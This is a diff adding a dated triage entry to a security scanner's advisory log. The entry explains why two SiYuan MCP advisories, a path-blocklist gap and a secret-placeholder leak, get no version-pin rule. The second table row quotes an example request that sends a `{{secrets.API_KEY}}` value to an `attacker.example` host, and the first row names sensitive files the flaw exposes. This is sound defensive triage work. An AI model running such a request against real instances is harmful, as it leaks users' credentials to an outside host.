@@ -16,6 +16,36 @@ open.
 > issue. The per-CVE latency figures in the tables are **measurements recorded at
 > the time**, kept as dated facts, not a standing promise.
 
+## 2026-08-24: two SiYuan advisories, and three reasons neither is reachable
+
+Both advisories are against SiYuan, both are fixed in v3.8.0, and neither ships a rule.
+That is worth writing down rather than leaving as an empty result, because everything
+about this pair looks pinnable: one named product, one clean fix version, and a package
+by that exact spelling on **both** npm and PyPI. Every one of those signals is a trap.
+
+Three independent reasons close both, and any one of them alone would look like a gap a
+future contributor could fix by adding the obvious pin. First, the artifact is a **Go
+module** - both GHSAs declare ecosystem `go`, package `github.com/siyuan-note/siyuan`,
+and there is no `go.mod` reader anywhere in this package, so the version never appears
+in a file `_CANDIDATE_NAMES` opens. Second, both same-named registry packages belong to
+**different projects**: npm `siyuan` is the plugin API type declarations from
+[siyuan-note/petal](https://github.com/siyuan-note/petal) (latest 1.2.5), PyPI `siyuan`
+is a third-party "SiYuan Api Implement" (0.1.2, three releases), and neither line ever
+reaches 3.x - a `>= 3.8.0` floor on either would fire on every release either package
+has ever published. Third, **no client config carries a version**: SiYuan mounts MCP on
+its own kernel (`ginServer.POST("/mcp", ...)`, default `:6806`), so a consumer's config
+holds a URL and a token, and the defect lives in the server's Go source rather than in
+any config the consumer writes.
+
+The half that *is* reachable was already covered before these advisories existed, which
+is the useful finding here: the class is not a gap, the product is out of reach.
+Dispositions locked in `tests/test_cve_triage_2026_08_24.py`.
+
+| CVE | Reference | AAK rule / disposition | Triaged |
+|---|---|---|---|
+| CVE-2026-60083 (SiYuan < v3.8.0, CWE-22, CVSS 3.1 4.9 / CVSS 4.0 6.9 - `kernel/mcp/tools/file.go`'s `resolvePath()` carries a sensitive-path blocklist whose own comment says it aligns with the HTTP file API's `refuseToAccess()`, but implements 1 of that API's 4 entries, so the MCP file tool reads `data/.siyuan/publishAccess.json` (plaintext publish-mode passwords), `data/templates` and `data/snippets/conf.json`) | [GHSA-c8r8-95hg-mp34](https://github.com/siyuan-note/siyuan/security/advisories/GHSA-c8r8-95hg-mp34) | **Out of scope** - the vulnerable artifact is the Go module `github.com/siyuan-note/siyuan`, and this detector reads no `go.mod`. The two registry packages spelled `siyuan` are different projects: npm `siyuan` is the plugin API typings from `siyuan-note/petal` at 1.2.5, PyPI `siyuan` is a third-party client at 0.1.2, and a `>= 3.8.0` floor on either fires on 100% of their releases. Nothing in a consuming project encodes this defect - SiYuan serves MCP over HTTP on its own kernel, so a client config holds a URL and a token and no version. Not reducible to "upgrade to v3.8.0": the `/mcp` routes are already behind `CheckAuth` + `CheckAdminRole`, so exposure requires an **admin**-role token, and the interim mitigation is to stop issuing admin tokens to MCP clients rather than to wait on the upgrade. Revisit if a `go.mod` reader is ever added - `test_the_pin_detector_reads_no_go_manifest` fails the moment one is, by design. (#632) | 2026-08-24 |
+| CVE-2026-59809 (SiYuan < v3.8.0, CWE-200, CVSS 3.1 4.9 / CVSS 4.0 6.9 - `Secrets.Resolve()` substitutes `{{secrets.NAME}}` placeholders with plaintext values wherever it is called, and `kernel/mcp/tools/http_request.go` applies it to the fully caller-controlled `url` parameter, so `action=get, url=https://attacker.example/collect?token={{secrets.API_KEY}}` sends the real secret to an attacker-chosen host with no confirmation) | [GHSA-853m-gvvm-6rvx](https://github.com/siyuan-note/siyuan/security/advisories/GHSA-853m-gvvm-6rvx) | **Out of scope as a pin, already covered as a class.** Same Go module / `go.mod` boundary and the same npm-`petal`-1.2.5 collision as the row above. The config-side shape - a secret placeholder written into a URL query string - is `AAK-TRANSPORT-004` (TRANSPORT_SECURITY, HIGH), which fires on both the `{{secrets.NAME}}` and `${VAR}` dialects; the code-side twin, a placeholder resolver reading process env while parsing a user-supplied MCP server URL, is `AAK-MCP-ENV-PLACEHOLDER-EXFIL-001` (CVE-2026-32625, LibreChat). Both are verified by scanning in `test_secret_placeholder_in_a_url_still_fires` rather than asserted here. No new rule: the reachable pattern already reports, and a second rule on it would report one config twice. (#631) | 2026-08-24 |
+
 ## 2026-08-22: one new pin, and one already covered
 
 The second row is the useful one: an advisory that needs no change, because a pin
